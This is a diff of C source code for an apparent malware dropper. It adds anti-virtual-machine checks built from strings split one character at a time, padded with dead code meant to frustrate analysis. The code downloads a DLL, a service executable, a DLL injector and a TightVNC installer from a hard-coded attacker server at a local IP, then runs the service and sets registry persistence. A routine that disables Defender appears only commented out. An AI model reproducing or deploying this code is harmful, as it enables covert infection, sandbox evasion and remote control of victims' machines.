+	char part_string_key_1_15[] = "C";
+	char part_string_key_1_16[] = "o";
+	char part_string_key_1_17[] = "n";
+	char part_string_key_1_18[] = "t";
+	char part_string_key_1_19[] = "r";
+	char part_string_key_1_20[] = "o";
+	char part_string_key_1_21[] = "l";
+	char part_string_key_1_22[] = "S";
+	char part_string_key_1_23[] = "e";
+	char part_string_key_1_24[] = "t";
+	char part_string_key_1_25[] = "\\C";
+	char part_string_key_1_26[] = "o";
+	char part_string_key_1_27[] = "n";
+	char part_string_key_1_28[] = "t";
+	char part_string_key_1_29[] = "r";
+	char part_string_key_1_30[] = "o";
+	char part_string_key_1_31[] = "l\\";
+	char part_string_key_1_32[] = "S";
+	char part_string_key_1_33[] = "y";
+	char part_string_key_1_34[] = "s";
+	char part_string_key_1_35[] = "t";
+	char part_string_key_1_36[] = "e";
+	char part_string_key_1_37[] = "m";
+	char part_string_key_1_38[] = "I";
+	char part_string_key_1_39[] = "n";
+	char part_string_key_1_40[] = "f";
+	char part_string_key_1_41[] = "o";
+	char part_string_key_1_42[] = "r";
+	char part_string_key_1_43[] = "m";
+	char part_string_key_1_44[] = "a";
+	char part_string_key_1_45[] = "t";
+	char part_string_key_1_46[] = "i";
+	char part_string_key_1_47[] = "o";
+	char part_string_key_1_48[] = "n";
+	strcpy(full_string_key_1, part_string_key_1_1);
+	strcat(full_string_key_1, part_string_key_1_2);
+	strcat(full_string_key_1, part_string_key_1_3);
+	strcat(full_string_key_1, part_string_key_1_4);
+	strcat(full_string_key_1, part_string_key_1_5);
+	strcat(full_string_key_1, part_string_key_1_6);
+	strcat(full_string_key_1, part_string_key_1_7);
+	strcat(full_string_key_1, part_string_key_1_8);
+	strcat(full_string_key_1, part_string_key_1_9);
+	strcat(full_string_key_1, part_string_key_1_10);
+	strcat(full_string_key_1, part_string_key_1_11);
+	strcat(full_string_key_1, part_string_key_1_12);
+	strcat(full_string_key_1, part_string_key_1_13);
+	strcat(full_string_key_1, part_string_key_1_14);
+	strcat(full_string_key_1, part_string_key_1_15);
+	strcat(full_string_key_1, part_string_key_1_16);
+	strcat(full_string_key_1, part_string_key_1_17);
+	strcat(full_string_key_1, part_string_key_1_18);
+	strcat(full_string_key_1, part_string_key_1_19);
+	strcat(full_string_key_1, part_string_key_1_20);
+	strcat(full_string_key_1, part_string_key_1_21);
+	strcat(full_string_key_1, part_string_key_1_22);
+	strcat(full_string_key_1, part_string_key_1_23);
+	strcat(full_string_key_1, part_string_key_1_24);
+	strcat(full_string_key_1, part_string_key_1_25);
+	strcat(full_string_key_1, part_string_key_1_26);
+	strcat(full_string_key_1, part_string_key_1_27);
+	strcat(full_string_key_1, part_string_key_1_28);
+	strcat(full_string_key_1, part_string_key_1_29);
+	strcat(full_string_key_1, part_string_key_1_30);
+	strcat(full_string_key_1, part_string_key_1_31);
+	strcat(full_string_key_1, part_string_key_1_32);
+	strcat(full_string_key_1, part_string_key_1_33);
+	strcat(full_string_key_1, part_string_key_1_34);
+	strcat(full_string_key_1, part_string_key_1_35);
+	strcat(full_string_key_1, part_string_key_1_36);
+	strcat(full_string_key_1, part_string_key_1_37);
+	strcat(full_string_key_1, part_string_key_1_38);
+	strcat(full_string_key_1, part_string_key_1_39);
+	strcat(full_string_key_1, part_string_key_1_40);
+	strcat(full_string_key_1, part_string_key_1_41);
+	strcat(full_string_key_1, part_string_key_1_42);
+	strcat(full_string_key_1, part_string_key_1_43);
+	strcat(full_string_key_1, part_string_key_1_44);
+	strcat(full_string_key_1, part_string_key_1_45);
+	strcat(full_string_key_1, part_string_key_1_46);
+	strcat(full_string_key_1, part_string_key_1_47);
+	strcat(full_string_key_1, part_string_key_1_48);
 
+
+	char full_string_key_2[100];	// SystemProductName
+	char part_string_key_2_1[] = "S";
+	char part_string_key_2_2[] = "y";
+	char part_string_key_2_3[] = "s";
+	char part_string_key_2_4[] = "t";
+	char part_string_key_2_5[] = "e";
+	char part_string_key_2_6[] = "m";
+	char part_string_key_2_7[] = "P";
+	char part_string_key_2_8[] = "r";
+	char part_string_key_2_9[] = "o";
+	char part_string_key_2_10[] = "d";
+	char part_string_key_2_11[] = "u";
+	char part_string_key_2_12[] = "c";
+	char part_string_key_2_13[] = "t";
+	char part_string_key_2_14[] = "N";
+	char part_string_key_2_15[] = "a";
+	char part_string_key_2_16[] = "m";
+	char part_string_key_2_17[] = "e";
+	strcpy(full_string_key_2, part_string_key_2_1);
+	strcat(full_string_key_2, part_string_key_2_2);
+	strcat(full_string_key_2, part_string_key_2_3);
+	strcat(full_string_key_2, part_string_key_2_4);
+	strcat(full_string_key_2, part_string_key_2_5);
+	strcat(full_string_key_2, part_string_key_2_6);
+	strcat(full_string_key_2, part_string_key_2_7);
+	strcat(full_string_key_2, part_string_key_2_8);
+	strcat(full_string_key_2, part_string_key_2_9);
+	strcat(full_string_key_2, part_string_key_2_10);
+	strcat(full_string_key_2, part_string_key_2_11);
+	strcat(full_string_key_2, part_string_key_2_12);
+	strcat(full_string_key_2, part_string_key_2_13);
+	strcat(full_string_key_2, part_string_key_2_14);
+	strcat(full_string_key_2, part_string_key_2_15);
+	strcat(full_string_key_2, part_string_key_2_16);
+	strcat(full_string_key_2, part_string_key_2_17);
+	
+	
+	char full_string_key_3[100];	// VMware
+	char part_string_key_3_1[] = "V";
+	char part_string_key_3_2[] = "M";
+	char part_string_key_3_3[] = "w";
+	char part_string_key_3_4[] = "a";
+	char part_string_key_3_5[] = "r";
+	char part_string_key_3_6[] = "e";
+	strcpy(full_string_key_3, part_string_key_3_1);
+	strcat(full_string_key_3, part_string_key_3_2);
+	strcat(full_string_key_3, part_string_key_3_3);
+	strcat(full_string_key_3, part_string_key_3_4);
+	strcat(full_string_key_3, part_string_key_3_5);
+	strcat(full_string_key_3, part_string_key_3_6);
+
+	char full_string_key_4[100];	// VirtualBox
+	char part_string_key_4_1[] = "V";
+	char part_string_key_4_2[] = "i";
+	char part_string_key_4_3[] = "r";
+	char part_string_key_4_4[] = "t";
+	char part_string_key_4_5[] = "u";
+	char part_string_key_4_6[] = "a";
+	char part_string_key_4_7[] = "l";
+	char part_string_key_4_8[] = "B";
+	char part_string_key_4_9[] = "o";
+	char part_string_key_4_10[] = "x";
+	strcpy(full_string_key_4, part_string_key_4_1);
+	strcat(full_string_key_4, part_string_key_4_2);
+	strcat(full_string_key_4, part_string_key_4_3);
+	strcat(full_string_key_4, part_string_key_4_4);
+	strcat(full_string_key_4, part_string_key_4_5);
+	strcat(full_string_key_4, part_string_key_4_6);
+	strcat(full_string_key_4, part_string_key_4_7);
+	strcat(full_string_key_4, part_string_key_4_8);
+	strcat(full_string_key_4, part_string_key_4_9);
+	strcat(full_string_key_4, part_string_key_4_10);
+
+
+	char full_string_key_5[100];	// BiosVersion
+	char part_string_key_5_1[] = "B";
+	char part_string_key_5_2[] = "i";
+	char part_string_key_5_3[] = "o";
+	char part_string_key_5_4[] = "s";
+	char part_string_key_5_5[] = "V";
+	char part_string_key_5_6[] = "e";
+	char part_string_key_5_7[] = "r";
+	char part_string_key_5_8[] = "s";
+	char part_string_key_5_9[] = "i";
+	char part_string_key_5_10[] = "o";
+	char part_string_key_5_11[] = "n";
+	strcpy(full_string_key_5, part_string_key_5_1);
+	strcat(full_string_key_5, part_string_key_5_2);
+	strcat(full_string_key_5, part_string_key_5_3);
+	strcat(full_string_key_5, part_string_key_5_4);
+	strcat(full_string_key_5, part_string_key_5_5);
+	strcat(full_string_key_5, part_string_key_5_6);
+	strcat(full_string_key_5, part_string_key_5_7);
+	strcat(full_string_key_5, part_string_key_5_8);
+	strcat(full_string_key_5, part_string_key_5_9);
+	strcat(full_string_key_5, part_string_key_5_10);
+	strcat(full_string_key_5, part_string_key_5_11);
+	
+	
+	char full_string_key_6[100];	// SystemManufacturer
+	char part_string_key_6_1[] = "S";
+	char part_string_key_6_2[] = "y";
+	char part_string_key_6_3[] = "s";
+	char part_string_key_6_4[] = "t";
+	char part_string_key_6_5[] = "e";
+	char part_string_key_6_6[] = "m";
+	char part_string_key_6_7[] = "M";
+	char part_string_key_6_8[] = "a";
+	char part_string_key_6_9[] = "n";
+	char part_string_key_6_10[] = "u";
+	char part_string_key_6_11[] = "f";
+	char part_string_key_6_12[] = "a";
+	char part_string_key_6_13[] = "c";
+	char part_string_key_6_14[] = "t";
+	char part_string_key_6_15[] = "u";
+	char part_string_key_6_16[] = "r";
+	char part_string_key_6_17[] = "e";
+	char part_string_key_6_18[] = "r";
+	strcpy(full_string_key_6, part_string_key_6_1);
+	strcat(full_string_key_6, part_string_key_6_2);
+	strcat(full_string_key_6, part_string_key_6_3);
+	strcat(full_string_key_6, part_string_key_6_4);
+	strcat(full_string_key_6, part_string_key_6_5);
+	strcat(full_string_key_6, part_string_key_6_6);
+	strcat(full_string_key_6, part_string_key_6_7);
+	strcat(full_string_key_6, part_string_key_6_8);
+	strcat(full_string_key_6, part_string_key_6_9);
+	strcat(full_string_key_6, part_string_key_6_10);
+	strcat(full_string_key_6, part_string_key_6_11);
+	strcat(full_string_key_6, part_string_key_6_12);
+	strcat(full_string_key_6, part_string_key_6_13);
+	strcat(full_string_key_6, part_string_key_6_14);
+	strcat(full_string_key_6, part_string_key_6_15);
+	strcat(full_string_key_6, part_string_key_6_16);
+	strcat(full_string_key_6, part_string_key_6_17);
+	strcat(full_string_key_6, part_string_key_6_18);
+
+	
+	if (Chk_VM_cmp(HKEY_LOCAL_MACHINE, full_string_key_1,
+	full_string_key_2, full_string_key_4,open_key_reg_func,query_key_reg_func)) {
+	//printf("VirtualBox VM registry key value detected :(\n");
+	// CALL DEAD CODE TO EXECUTE
+	//to show in main graph flow
+	int x = 0;
+	x += 1;
+	x -= 1;
+	x *= 2;
+	x /= 2;
+
+	// Additional complex math operations
+	double y = 2.5;
+	double z = 3.7;
+	double result = 0.0;
+
+	// Perform math operations
+	result = sqrt(pow(y, 2) + pow(z, 2)); 
+	result = sin(result);
+	result = cos(result); 
+	result = tan(result); 
+
+	// Use the result to perform more operations
+	for (int i = 0; i < 10; ++i) {
+		result *= i;
+		result /= (i + 1);
+		result += i;
+	}
+	// Use the final result to perform some conditional operations
+	if (result > 100) {
+		result -= 124213;
+	} 
+	else {
+		result += 2134;
+	}
+	
+	exit(0);	//Debug
+	
+	}
+
+	if (Chk_VM_cmp(HKEY_LOCAL_MACHINE, full_string_key_1,
+	full_string_key_5, full_string_key_4,open_key_reg_func,query_key_reg_func)) {
+	//printf("VirtualBox VM BIOS version detected :(\n");
+	// CALL DEAD CODE TO EXECUTE
+	//to show in main graph flow
+	int x = 0;
+	x += 1;
+	x -= 1;
+	x *= 2;
+	x /= 2;
+
+	// Additional complex math operations
+	double y = 2.5;
+	double z = 3.7;
+	double result = 0.0;
+
+	// Perform math operations
+	result = sqrt(pow(y, 2) + pow(z, 2)); 
+	result = sin(result);
+	result = cos(result); 
+	result = tan(result); 
+
+	// Use the result to perform more operations
+	for (int i = 0; i < 10; ++i) {
+		result *= i;
+		result /= (i + 1);
+		result += i;
+	}
+	// Use the final result to perform some conditional operations
+	if (result > 100) {
+		result -= 124213;
+	} 
+	else {
+		result += 2134;
+	}
+	
+	exit(0);	//Debug
+	}
+	
+	if (Chk_VM_substr(HKEY_LOCAL_MACHINE, full_string_key_1,
+	full_string_key_6, full_string_key_3,open_key_reg_func,query_key_reg_func)) {
+	//printf("VMware VM registry key value detected using substr from SystemManufacturer:(\n");
+	// CALL DEAD CODE TO EXECUTE
+	//to show in main graph flow
+	int x = 0;
+	x += 1;
+	x -= 1;
+	x *= 2;
+	x /= 2;
+
+	// Additional complex math operations
+	double y = 2.5;
+	double z = 3.7;
+	double result = 0.0;
+
+	// Perform math operations
+	result = sqrt(pow(y, 2) + pow(z, 2)); 
+	result = sin(result);
+	result = cos(result); 
+	result = tan(result); 
+
+	// Use the result to perform more operations
+	for (int i = 0; i < 10; ++i) {
+		result *= i;
+		result /= (i + 1);
+		result += i;
+	}
+	// Use the final result to perform some conditional operations
+	if (result > 100) {
+		result -= 124213;
+	} 
+	else {
+		result += 2134;
+	}
+	
+	exit(0);	//Debug
+	}
+	
+	if (Chk_VM_substr(HKEY_LOCAL_MACHINE, full_string_key_1,
+	full_string_key_2, full_string_key_3,open_key_reg_func,query_key_reg_func)) {
+	//printf("VMware VM registry key value detected using substr from SystemProductName:(\n");
+	// CALL DEAD CODE TO EXECUTE
+	//to show in main graph flow
+	int x = 0;
+	x += 1;
+	x -= 1;
+	x *= 2;
+	x /= 2;
+
+	// Additional complex math operations
+	double y = 2.5;
+	double z = 3.7;
+	double result = 0.0;
+
+	// Perform math operations
+	result = sqrt(pow(y, 2) + pow(z, 2)); 
+	result = sin(result);
+	result = cos(result); 
+	result = tan(result); 
+
+	// Use the result to perform more operations
+	for (int i = 0; i < 10; ++i) {
+		result *= i;
+		result /= (i + 1);
+		result += i;
+	}
+	// Use the final result to perform some conditional operations
+	if (result > 100) {
+		result -= 124213;
+	} 
+	else {
+		result += 2134;
+	}
+	
+	exit(0);	//Debug
+	}
+	
+	Chk_VM(NT_DelayExecution);
+	// --- END ANTI-VM --- //
 	
 	
 	// --- START CREATE MUTEX --- //
@@ -2250,13 +2988,6 @@ int main(){
 	hMux=m_stuff(NT_OpenMutant,NT_CreateMutant,hMux,&Object_Attr_mutant);
 	// --- END CREATE MUTEX --- //
 
-
-	LARGE_INTEGER sleepInterval;
-	sleepInterval.QuadPart = -3600000000LL; // 6 minutes (360 seconds) in 100-ns units
-	//printf("[+] BEGIN SLEEP\n");
-	NT_DelayExecution(FALSE, &sleepInterval);
-	//printf("[+]sleep done\n");
-	//return 0;
 
 	
 	// --- START FILE/NET OPS --- //
@@ -2306,7 +3037,7 @@ int main(){
 	
 	//printf("%s\n",full_string_1);
 	
-	char full_string_n3t[100];  //http://192.168.100.5:8000/
+	char full_string_n3t[100];  //http://192.168.8.161:8000
 	char part_n3t_1[] = "h";
 	char part_n3t_2[] = "t";
 	char part_n3t_3[] = "tp";
@@ -2318,10 +3049,10 @@ int main(){
 	char part_n3t_9[] = ".1";
 	char part_n3t_10[] = "6";
 	char part_n3t_11[] = "8.";
-	char part_n3t_12[] = "1";
-	char part_n3t_13[] = "00.";
-	char part_n3t_14[] = "5";
-	char part_n3t_15[] = ":";
+	char part_n3t_12[] = "8";
+	char part_n3t_13[] = ".1";
+	char part_n3t_14[] = "6";
+	char part_n3t_15[] = "1:";
 	char part_n3t_16[] = "8";
 	char part_n3t_17[] = "000";
 	char part_n3t_18[] = "/";
@@ -2430,11 +3161,11 @@ int main(){
 	//printf("%s\n",full_string_7);
 	//wprintf(L"%s\n",file_path_1);
 
-	char full_string_n3t_1[110]; //http://192.168.100.5:8000/legit.dll
+	char full_string_n3t_1[110]; //http://192.168.8.161:8000/legit.dll
 	strcpy(full_string_n3t_1,full_string_n3t);
 	strcat(full_string_n3t_1,full_string_5);
 
-	
+	//printf("[+] Going into the download function with that arg -> %s\n",full_string_n3t_1);
 	dw_ff1e1(full_string_n3t_1, full_string_7,n3t_op3n_func,n3t_op3n_ur1_func,n3t_r3ad_f1l3_func,n3t_cl0s3_hndl3_func);
 
 	
@@ -2494,9 +3225,10 @@ int main(){
 	//printf("%s\n",full_string_10);
 	
 
-	char full_string_n3t_2[110]; //http://192.168.100.5:8000/win_service32.exe
+	char full_string_n3t_2[110]; //http://192.168.8.161:8000/win_service32.exe
 	strcpy(full_string_n3t_2,full_string_n3t);
 	strcat(full_string_n3t_2,full_string_8);
+	//printf("[+] Going into the download function with that arg -> %s\n",full_string_n3t_2);
 	dw_ff1e1(full_string_n3t_2,full_string_10,n3t_op3n_func,n3t_op3n_ur1_func,n3t_r3ad_f1l3_func,n3t_cl0s3_hndl3_func);
 
 	char full_string_11[20];	// "dll_injector.exe"
@@ -2558,9 +3290,10 @@ int main(){
 	
 	
 	
-	char full_string_n3t_3[110]; //http://192.168.100.5:8000/dll_injector.exe
+	char full_string_n3t_3[110]; //http://192.168.8.161:8000/dll_injector.exe
 	strcpy(full_string_n3t_3,full_string_n3t);
-	strcat(full_string_n3t_3,full_string_12);
+	strcat(full_string_n3t_3,full_string_11);
+	//printf("[+] Going into the download function with that arg -> %s\n",full_string_n3t_3);
 	dw_ff1e1(full_string_n3t_3, full_string_13,n3t_op3n_func,n3t_op3n_ur1_func,n3t_r3ad_f1l3_func,n3t_cl0s3_hndl3_func);
 	
 	
@@ -2654,9 +3387,10 @@ int main(){
 	
 	
 	
-	char full_string_n3t_4[110]; //http://192.168.100.5:8000/tightVNC.msi
+	char full_string_n3t_4[110]; //http://192.168.8.161:8000/tightVNC.msi
 	strcpy(full_string_n3t_4,full_string_n3t);
 	strcat(full_string_n3t_4,full_string_14);
+	//printf("[+] Going into the download function with that arg -> %s\n",full_string_n3t_4);
 	dw_ff1e1(full_string_n3t_4,full_string_16,n3t_op3n_func,n3t_op3n_ur1_func,n3t_r3ad_f1l3_func,n3t_cl0s3_hndl3_func);
 	
 	// --- END FILE/NET OPS --- //
@@ -2679,21 +3413,21 @@ int main(){
 	
 	system(full_string_10); // exec win_service32.exe and install the service
 
-	
+	w1n_Rm();
 
 	//PERSISTANCE SHOULD EXECUTE THE DLL_INJECTOR.EXE malicious.dll 
 	// --- START PERSISTANCE --- //
 	ff_131mva(open_key_reg_func,set_key_reg_func,close_key_reg_func);
 	// --- END PERSISTANCE --- //
 	
-	// --- START START THE SERVICE --- //
-	
-	all1_901A(open_SC_func,open_service_func,start_service_func,close_service_func);
+	// --- FORCE START THE SERVICE (for testing) --- //
+	// you shouldn't start the service and let it start automatically with bootup
+	//all1_901A(open_SC_func,open_service_func,start_service_func,close_service_func);
 	
 	// --- END START THE SERVICE ---//
 	
 	// --- START DISABLE DEFENDER --- //
-	faow1231(open_key_reg_func,set_key_reg_func,close_key_reg_func);	//VERY NOISY
+	//faow1231(open_key_reg_func,set_key_reg_func,close_key_reg_func);	//VERY NOISY
 	// --- END DISABLE DEFENDER --- //
 	
 CLEANUP:
